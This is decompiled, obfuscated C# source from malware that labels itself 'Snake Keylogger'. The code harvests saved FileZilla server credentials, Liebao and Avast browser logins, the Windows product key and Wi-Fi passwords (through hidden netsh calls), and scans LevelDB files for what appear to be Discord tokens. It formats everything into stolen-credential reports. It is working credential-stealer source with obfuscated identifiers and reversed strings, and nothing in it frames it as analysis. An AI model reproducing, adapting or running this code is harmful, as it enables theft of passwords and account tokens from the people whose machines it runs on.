				Array.Copy(OΩʤ_FFFDӛ, array, OΩʤ_FFFDӛ.Length);
				Array.Copy(ē_0097_FFFDӥɛ, 0, array, OΩʤ_FFFDӛ.Length, ē_0097_FFFDӥɛ.Length);
				byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + OΩʤ_FFFDӛ.Length + (ē_0097_FFFDӥɛ.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(OΩʤ_FFFDӛ, 0, array, array2.Length, OΩʤ_FFFDӛ.Length);
				Array.Copy(ē_0097_FFFDӥɛ, 0, array, array2.Length + OΩʤ_FFFDӛ.Length, ē_0097_FFFDӥɛ.Length);
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				tripleDESCryptoServiceProvider.Key = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(_FFFDŲm_06E8ƌ, 0, _FFFDŲm_06E8ƌ.Length);
				return Encoding.Unicode.GetString(bytes);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string _FFFD盀_1CFC_0314ӓ()
	{
		string filename = Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml";
		string result = default(string);
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(filename);
			XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("Host");
			XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("User");
			XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("Pass");
			XmlNodeList elementsByTagName4 = xmlDocument.GetElementsByTagName("Port");
			string text = "";
			string text2 = "";
			string text3 = "";
			string text4 = "";
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = elementsByTagName.GetEnumerator();
				while (enumerator.MoveNext())
				{
					XmlElement xmlElement = (XmlElement)enumerator.Current;
					text3 = xmlElement.InnerText;
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = elementsByTagName2.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					XmlElement xmlElement2 = (XmlElement)enumerator2.Current;
					text2 = xmlElement2.InnerText;
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator3 = default(IEnumerator);
			try
			{
				enumerator3 = elementsByTagName3.GetEnumerator();
				while (enumerator3.MoveNext())
				{
					XmlElement xmlElement3 = (XmlElement)enumerator3.Current;
					text = xmlElement3.InnerText;
				}
			}
			finally
			{
				if (enumerator3 is IDisposable)
				{
					(enumerator3 as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator4 = default(IEnumerator);
			try
			{
				enumerator4 = elementsByTagName4.GetEnumerator();
				while (enumerator4.MoveNext())
				{
					XmlElement xmlElement4 = (XmlElement)enumerator4.Current;
					text4 = xmlElement4.InnerText;
				}
			}
			finally
			{
				if (enumerator4 is IDisposable)
				{
					(enumerator4 as IDisposable).Dispose();
				}
			}
			string text5 = null;
			byte[] bytes = Convert.FromBase64String(text.ToString());
			text = Encoding.ASCII.GetString(bytes);
			text5 = string.Concat("\r\n-------- Snake Keylogger --------\r\nFound From: FileZilla\r\n", "Host: " + text3 + "\r\nUsername: " + text2 + "\r\nPassword: " + text + "\r\nPort: " + text4 + "\r\n---------------------------------\r\n");
			鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void یՕױ䕃_0314()
	{
	}

	public static void _FFFDKΑՕ_0040()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Liebao7\\User Data\\Default\\EncryptedStorage";
		try
		{
			object obj = new _0739ߡс_02E8鈟(text);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj), (Type)null, "ReadTable", new object[1] { "entries" }, (string[])null, (Type[])null, (bool[])null, true);
			if (!File.Exists(text))
			{
				return;
			}
			int num = 0;
			int num2 = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (Type)null, "GetRowCount", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)1)));
			int num3 = num;
			int num4 = num2;
			for (int i = num3; i <= num4; i = checked(i + 1))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(obj);
				Type type = null;
				string text2 = "GetValue";
				object[] array = new object[2] { i, "str3" };
				object[] array2 = array;
				string[] array3 = null;
				Type[] array4 = null;
				bool[] array5 = new bool[2] { true, false };
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), type, text2, array2, array3, array4, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0])), typeof(int)));
				}
				string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
				object objectValue3 = RuntimeHelpers.GetObjectValue(obj);
				Type type2 = null;
				string text4 = "GetValue";
				object[] array6 = new object[2] { i, "str2" };
				object[] array7 = array6;
				string[] array8 = null;
				Type[] array9 = null;
				array5 = new bool[2] { true, false };
				object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), type2, text4, array7, array8, array9, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				string text5 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
				object @default = Encoding.Default;
				Type type3 = null;
				string text6 = "GetBytes";
				object[] array10 = new object[1];
				object[] array11 = array10;
				int num5 = 0;
				object objectValue5 = RuntimeHelpers.GetObjectValue(obj);
				object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
				Type type4 = null;
				string text7 = "GetValue";
				array = new object[2] { i, null };
				object[] array12 = array;
				int num6 = 1;
				string text8 = (string)(array12[num6] = "blob0");
				array6 = array;
				object[] array13 = array6;
				string[] array14 = null;
				Type[] array15 = null;
				array5 = new bool[2] { true, false };
				object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), type4, text7, array13, array14, array15, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				array11[num5] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
				object[] array16 = array10;
				object[] array17 = array16;
				string[] array18 = null;
				Type[] array19 = null;
				bool[] array20 = new bool[1] { true };
				object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(@default), type3, text6, array17, array18, array19, array20));
				if (array20[0])
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type)null, "GetValue", new object[3]
					{
						i,
						text8,
						RuntimeHelpers.GetObjectValue(array16[0])
					}, (string[])null, (Type[])null, true, false);
				}
				string text9 = œ_06E8_FFFDӛ_FFFD((byte[])objectValue8);
				if ((Operators.CompareString(text5, "", false) != 0) & (Operators.CompareString(text9, "", false) != 0))
				{
					string text10 = "\r\n-------- Snake Keylogger --------\r\nFound From: Liebao\r\nHost: " + text3 + "\r\nUsername: " + text5 + "\r\nPassword: " + text9 + "\r\n---------------------------------\r\n";
					鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text10;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void УŁչƚ2()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\AVAST Software\\Browser\\User Data\\Default\\Login Data";
		try
		{
			object obj = new _0739ߡс_02E8鈟(text);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj), (Type)null, "ReadTable", new object[1] { Strings.StrReverse("snigol") }, (string[])null, (Type[])null, (bool[])null, true);
			if (!File.Exists(text))
			{
				return;
			}
			int num = 0;
			int num2 = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (Type)null, "GetRowCount", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)1)));
			int num3 = num;
			int num4 = num2;
			for (int i = num3; i <= num4; i = checked(i + 1))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(obj);
				Type type = null;
				string text2 = "GetValue";
				object[] array = new object[2]
				{
					i,
					Strings.StrReverse("lru_nigiro")
				};
				object[] array2 = array;
				string[] array3 = null;
				Type[] array4 = null;
				bool[] array5 = new bool[2] { true, false };
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), type, text2, array2, array3, array4, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0])), typeof(int)));
				}
				string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
				object objectValue3 = RuntimeHelpers.GetObjectValue(obj);
				Type type2 = null;
				string text4 = "GetValue";
				object[] array6 = new object[2]
				{
					i,
					Strings.StrReverse("eulav_emanresu")
				};
				object[] array7 = array6;
				string[] array8 = null;
				Type[] array9 = null;
				array5 = new bool[2] { true, false };
				object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), type2, text4, array7, array8, array9, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				string text5 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
				object @default = Encoding.Default;
				Type type3 = null;
				string text6 = "GetBytes";
				object[] array10 = new object[1];
				object[] array11 = array10;
				int num5 = 0;
				object objectValue5 = RuntimeHelpers.GetObjectValue(obj);
				object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
				Type type4 = null;
				string text7 = "GetValue";
				array = new object[2] { i, null };
				object[] array12 = array;
				int num6 = 1;
				string text8 = (string)(array12[num6] = Strings.StrReverse("eulav_drowssap"));
				array6 = array;
				object[] array13 = array6;
				string[] array14 = null;
				Type[] array15 = null;
				array5 = new bool[2] { true, false };
				object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), type4, text7, array13, array14, array15, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				array11[num5] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
				object[] array16 = array10;
				object[] array17 = array16;
				string[] array18 = null;
				Type[] array19 = null;
				bool[] array20 = new bool[1] { true };
				object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(@default), type3, text6, array17, array18, array19, array20));
				if (array20[0])
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type)null, "GetValue", new object[3]
					{
						i,
						text8,
						RuntimeHelpers.GetObjectValue(array16[0])
					}, (string[])null, (Type[])null, true, false);
				}
				string text9 = œ_06E8_FFFDӛ_FFFD((byte[])objectValue8);
				if ((Operators.CompareString(text5, "", false) != 0) & (Operators.CompareString(text9, "", false) != 0))
				{
					string text10 = "\r\n-------- Snake Keylogger --------\r\nFound From: Avast\r\nHost: " + text3 + "\r\nUsername: " + text5 + "\r\nPassword: " + text9 + "\r\n---------------------------------\r\n";
					鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text10;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static string ا_FFFD_05C3߂븤()
	{
		string text = "";
		checked
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
				byte[] sourceArray = (byte[])registryKey.GetValue("DigitalProductID");
				byte[] array = new byte[15];
				Array.Copy(sourceArray, 52, array, 0, 15);
				string text2 = "BCDFGHJKMPQRTVWXY2346789";
				int num = 0;
				do
				{
					short num2 = 0;
					int num3 = 14;
					do
					{
						num2 = (short)((num2 * 256) ^ array[num3]);
						array[num3] = (byte)Conversion.Int((double)num2 / 24.0);
						num2 = (short)unchecked(num2 % 24);
						num3 += -1;
					}
					while (num3 >= 0);
					text = text2.Substring(num2, 1) + text;
					num++;
				}
				while (num <= 24);
				int num4 = 4;
				do
				{
					text = text.Insert(num4 * 5, "-");
					num4 += -1;
				}
				while (num4 >= 1);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return text;
		}
	}

	public static void Ϙҡ_FFFD_05B5_06DA()
	{
	}

	private static void _0300ߡŴ_FFFDԌ(string UΠ_0739מ_FFFD)
	{
		checked
		{
			using StringReader stringReader = new StringReader(UΠ_0739מ_FFFD);
			string 퓜_0385і丐_0300 = default(string);
			while (Ò뜸ӓȨ_FFFD(ref 퓜_0385і丐_0300, stringReader.ReadLine()) != null)
			{
				ę_07B8ʭ_0306皍++;
				ꓞأ_FFFDjՕ(퓜_0385і丐_0300);
			}
		}
	}

	public static void mגӛ_1CFCک()
	{
	}

	private static void ꓞأ_FFFDjՕ(string _FFFD_FFFD㠰ΩK)
	{
		Regex regex = new Regex("All User Profile * : (?<after>.*)");
		Match match = regex.Match(_FFFD_FFFD㠰ΩK);
		checked
		{
			if (match.Success)
			{
				O_00AB_FFFD_FFFDΑ++;
				string value = match.Groups["after"].Value;
				string text = ܪ_0327ﾭƉՕ(value) + "\r\n===============";
				_07A8թ츠іߡ = _07A8թ츠іߡ + string.Format("{0}{1}", "WiFi Name: " + value.PadRight(20), "\r\nPassword:  " + text) + "\r\n";
			}
		}
	}

	public static string _2964کBҡK(string ƌ_0327泮_FFFD_FFFD)
	{
		string arguments = "wlan show profile name=\"" + ƌ_0327泮_FFFD_FFFD + "\" key=clear";
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "netsh";
		process.StartInfo.Arguments = arguments;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		string result = process.StandardOutput.ReadToEnd();
		string text = process.StandardError.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string ג_FFFD_06DA_FFFDƚ()
	{
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "netsh";
		process.StartInfo.Arguments = "wlan show profile";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		string result = process.StandardOutput.ReadToEnd();
		string text = process.StandardError.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string ܪ_0327ﾭƉՕ(string ﾭ_FFFDR_FFFDë)
	{
		string s = _2964کBҡK(ﾭ_FFFDR_FFFDë);
		using (StringReader stringReader = new StringReader(s))
		{
			string 퓜_0385і丐_0300 = default(string);
			while (Ò뜸ӓȨ_FFFD(ref 퓜_0385і丐_0300, stringReader.ReadLine()) != null)
			{
				Regex regex = new Regex("Key Content * : (?<after>.*)");
				Match match = regex.Match(퓜_0385і丐_0300);
				if (match.Success)
				{
					return match.Groups["after"].Value;
				}
			}
		}
		return "Open Network";
	}

	[Obsolete("Please refactor calling code to use normal Visual Basic assignment")]
	public static T Ò뜸ӓȨ_FFFD<T>(ref T 퓜_0385і丐_0300, T _0332_FFFD_FFFDjמ)
	{
		퓜_0385і丐_0300 = _0332_FFFD_FFFDjמ;
		return _0332_FFFD_FFFDjמ;
	}

	private static void ʭ츠_FFFDε_FFFD()
	{
		string text = ג_FFFD_06DA_FFFDƚ();
		_0300ߡŴ_FFFDԌ(text);
	}

	public static void ɇ_FFFDAأU()
	{
	}

	private static bool ٵåˤŁᔖ(ref string _07B8Α㠰أ똛)
	{
		bool result;
		if (Directory.Exists(_07B8Α㠰أ똛))
		{
			FileInfo[] files = new DirectoryInfo(_07B8Α㠰أ똛).GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				if (fileInfo.get_Name().EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
				{
					_07B8Α㠰أ똛 += fileInfo.get_Name();
					return _07B8Α㠰أ똛.EndsWith(".ldb");
				}
			}
			result = _07B8Α㠰أ똛.EndsWith(".ldb");
		}
		else
		{
			result = false;
		}
		return result;
	}

	private static string _02F3_FFFDב_02F3_FFFD(string ųÒ_0739߂_FFFD)
	{
		string[] collection = ųÒ_0739߂_FFFD.Substring(checked(ųÒ_0739߂_FFFD.IndexOf("oken") + 4)).Split(new char[1] { '"' });
		List<string> list = new List<string>();
		list.AddRange(collection);
		list.RemoveAt(0);
		collection = list.ToArray();
		return string.Join("\"", collection);
	}

	private static string _FFFDʭ_0332Ɯ_0300(string 똛_05B5_FFFDҚΑ, bool _FFFD뜸_06E3ڿЦ = false)
	{
		byte[] bytes = File.ReadAllBytes(똛_05B5_FFFDҚΑ);
		string @string = Encoding.UTF8.GetString(bytes);
		string text = "";
		string text2 = @string;
		while (text2.Contains("oken"))
		{
			string[] array = _02F3_FFFDב_02F3_FFFD(text2).Split(new char[1] { '"' });
			text = array[0];
			text2 = string.Join("\"", array);
			if (_FFFD뜸_06E3ڿЦ && text.Length == 59)
			{
				break;
			}
		}
		return text;
	}
}
